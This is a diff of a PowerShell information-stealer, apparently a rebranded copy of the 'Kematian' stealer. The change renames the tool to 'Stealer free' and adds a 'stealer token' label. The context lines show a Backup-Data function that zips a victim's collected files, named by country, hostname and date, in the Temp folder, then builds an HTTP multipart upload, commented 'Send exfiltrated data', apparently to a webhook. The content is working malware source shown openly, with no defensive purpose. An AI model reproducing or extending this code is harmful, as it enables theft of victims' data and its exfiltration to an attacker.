@@ -15,7 +15,7 @@ else {
 }
 
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
-
+$name = "stealer token"
 
 # Load WPF assemblies
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
@@ -1314,7 +1314,7 @@ function Backup-Data {
     # Send exfiltrated data
     $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
     $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"; Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
-    $messageContent = @{username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
+    $messageContent = @{username = "Stealer free" ; avatar_url = $avatar } | ConvertTo-Json
     $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new(); $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent)
     $messageContentStream = [IO.MemoryStream]::new(); $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
     $streamContent = [Net.Http.StreamContent]::new($messageContentStream); $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
